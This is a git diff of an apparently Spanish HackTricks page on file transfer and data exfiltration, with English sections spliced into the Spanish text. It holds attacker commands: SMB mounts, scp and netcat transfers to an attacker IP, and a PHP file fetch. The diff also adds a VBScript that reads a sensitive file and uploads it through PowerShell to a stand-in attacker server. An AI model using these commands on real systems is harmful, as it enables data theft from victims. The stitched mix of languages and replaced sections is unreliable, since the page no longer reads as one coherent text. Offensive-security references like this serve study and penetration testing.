@@ -2,13 +2,13 @@
 
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
 
 Otras formas de apoyar a HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
@@ -16,7 +16,7 @@ Otras formas de apoyar a HackTricks:
 
 **Grupo de Seguridad Try Hard**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -187,36 +187,47 @@ service smbd restart
 ```
 # Exfiltration
 
-## Introduction
-
-Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as using command and control (C2) channels, exfiltrating data over DNS, or leveraging cloud storage services.
-
 ## Techniques
 
-### Data Compression
+### Exfiltration Over Command and Control Channel
 
-Data can be compressed before exfiltration to reduce its size and avoid detection.
+- **Description:** Data exfiltration can be achieved by sending the stolen data over the command and control channel used by the malware.
+  
+- **Detection:** Monitoring network traffic for unusual patterns or large amounts of data being sent to suspicious destinations can help detect this exfiltration technique.
 
-### Data Encryption
+### Exfiltration Over Alternative Protocols
 
-Encrypting exfiltrated data can help prevent detection and protect the confidentiality of the information.
+- **Description:** Attackers can use alternative protocols such as DNS, ICMP, or HTTPS to exfiltrate data from the target network.
+  
+- **Detection:** Analyzing network traffic for unusual usage of these protocols or unexpected data transfers can help in detecting this exfiltration technique.
 
-### Steganography
+### Exfiltration Over Encrypted Channels
 
-Steganography involves hiding data within other files or images to avoid detection.
+- **Description:** Attackers can encrypt the exfiltrated data before sending it over the network to evade detection.
+  
+- **Detection:** Monitoring for encrypted traffic leaving the network or using behavioral analysis to identify anomalies in encrypted communication can help detect this exfiltration technique.
 
-### Data Fragmentation
+## Tools
 
-Breaking data into smaller fragments can help avoid detection and make exfiltration more stealthy.
+### Wireshark
 
-## Tools and Resources
+- **Description:** Wireshark is a popular network protocol analyzer that can be used to capture and analyze network traffic. It can help in detecting data exfiltration by monitoring network packets.
 
-- **Cobalt Strike**: A popular tool for post-exploitation activities, including exfiltration.
-- **Empire**: Another post-exploitation framework that can be used for exfiltration.
-- **PowerShell**: Built-in Windows tool that can be used for data exfiltration.
-- **Cloud Storage Services**: Platforms like Dropbox, Google Drive, and OneDrive can be leveraged for exfiltrating data.
+### tcpdump
 
-By using a combination of these techniques and tools, attackers can exfiltrate data from a target system without being detected.
+- **Description:** tcpdump is a command-line packet analyzer that runs on the terminal. It can capture network packets and display them in real-time, making it useful for detecting data exfiltration.
+
+### Bro/Zeek
+
+- **Description:** Bro/Zeek is a powerful network analysis framework that can be used to detect various network anomalies, including data exfiltration attempts. It provides detailed logs for network traffic analysis.
+
+### Security Information and Event Management (SIEM) Tools
+
+- **Description:** SIEM tools like Splunk, ArcSight, or QRadar can help in centralizing and analyzing log data from various sources to detect data exfiltration attempts. They provide alerts for suspicious activities on the network.
+
+### Data Loss Prevention (DLP) Solutions
+
+- **Description:** DLP solutions like Symantec DLP, McAfee DLP, or Forcepoint DLP can help prevent data exfiltration by monitoring and blocking sensitive data transfers outside the network.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -232,7 +243,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Si la víctima tiene SSH, el atacante puede montar un directorio desde la víctima hacia el atacante.
+Si la víctima tiene SSH, el atacante puede montar un directorio de la víctima al atacante.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -240,23 +251,17 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Técnicas de Exfiltración
+### Description
 
-#### Exfiltración a través de DNS
+Netcat (nc) is a versatile networking tool that can be used for various purposes, including exfiltration of data. It allows for creating connections to different network services, port scanning, and transferring files between systems. Netcat can be used to establish a connection between a compromised system and an external server controlled by the attacker, enabling the exfiltration of sensitive information.
 
-La exfiltración a través de DNS implica el envío de datos sensibles a un servidor controlado por el atacante a través de consultas DNS. Esto puede ser logrado utilizando subdominios para representar los datos a exfiltrar.
+### Detection
 
-#### Exfiltración a través de ICMP
+Detection of Netcat usage can be challenging due to its versatility and the fact that it is a legitimate networking tool. Monitoring network traffic for suspicious connections or unusual data transfers may help in detecting potential exfiltration activities using Netcat. Additionally, monitoring system logs for any unauthorized Netcat processes or connections can aid in early detection of malicious activities.
 
-La exfiltración a través de ICMP implica el envío de datos a través de mensajes ICMP. Los datos pueden ser codificados en los campos de datos de los mensajes ICMP para ser transmitidos a un servidor controlado por el atacante.
+### Prevention
 
-#### Exfiltración a través de HTTP/S
-
-La exfiltración a través de HTTP/S implica el envío de datos a través de solicitudes HTTP o HTTPS a un servidor controlado por el atacante. Los datos pueden ser codificados en los encabezados HTTP o en el cuerpo de la solicitud.
-
-#### Exfiltración a través de canales encubiertos
-
-La exfiltración a través de canales encubiertos implica el uso de técnicas avanzadas para ocultar la transferencia de datos sensibles. Esto puede incluir el uso de protocolos no convencionales o la modificación de protocolos existentes para pasar desapercibido.
+To prevent unauthorized exfiltration of data using Netcat, organizations can implement network segmentation to restrict communication channels, enforce the principle of least privilege to limit access to sensitive data, and deploy network monitoring tools to detect and block suspicious activities. Regularly updating and patching systems can also help prevent attackers from exploiting known vulnerabilities to exfiltrate data using tools like Netcat.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -329,22 +334,31 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### Exfiltration
+### Visual Basic Scripting Edition (VBScript)
 
-VBScript can be used to exfiltrate data by sending it over HTTP or HTTPS to an attacker-controlled server. This can be achieved by creating an HTTP request object, setting the request method, adding headers, and sending the data in the request body. The following example demonstrates how data can be exfiltrated using VBScript:
+VBScript is a lightweight scripting language developed by Microsoft. It is commonly used for client-side web development and can also be used for server-side scripting. VBScript is often executed by Windows Script Host (WSH) and can be used to automate tasks, manipulate files, and interact with Windows components.
+
+### Exfiltration using VBScript
+
+VBScript can be used for exfiltration by reading data from files or system information and sending it to an external server using various protocols such as HTTP or FTP. This can be achieved by writing scripts that collect the desired information and then establish a connection to a remote server to transmit the data.
+
+### Example
 
 ```vbscript
-Dim objHTTP, strData
-Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-strData = "exfiltrated_data_here"
-objHTTP.Open "POST", "http://attacker-server.com/data_receiver", False
-objHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-objHTTP.send strData
+Dim objFSO, objFile, objShell
+Dim data, url
+
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objFile = objFSO.OpenTextFile("C:\sensitive_data.txt", 1)
+data = objFile.ReadAll
+objFile.Close
+
+url = "http://attacker-server.com/receive.php"
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "powershell -Command (New-Object System.Net.WebClient).UploadString('" & url & "', '" & data & "')"
 ```
 
-In this example, the `MSXML2.ServerXMLHTTP` object is used to create an HTTP request. The data to be exfiltrated is stored in the `strData` variable. The `Open` method is used to specify the request method and target URL. Headers can be added using the `setRequestHeader` method. Finally, the data is sent in the request body using the `send` method.
-
-It is important to note that exfiltrating data using VBScript may trigger security alerts, as it can be detected by endpoint security solutions. Encryption and obfuscation techniques can be used to evade detection.
+In this example, the VBScript reads the contents of a file named `sensitive_data.txt`, stores it in the `data` variable, and then sends it to an attacker-controlled server using PowerShell to perform an HTTP POST request.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -388,18 +402,13 @@ El programa `debug.exe` no solo permite la inspección de binarios, sino que tam
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-```markdown
-Luego copie y pegue el texto en la ventana de comandos de Windows y se creará un archivo llamado nc.exe.
-
-* [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
-
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -409,11 +418,10 @@ Luego copie y pegue el texto en la ventana de comandos de Windows y se creará u
 
 Otras formas de apoyar a HackTricks:
 
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
+* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
 * Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
-```
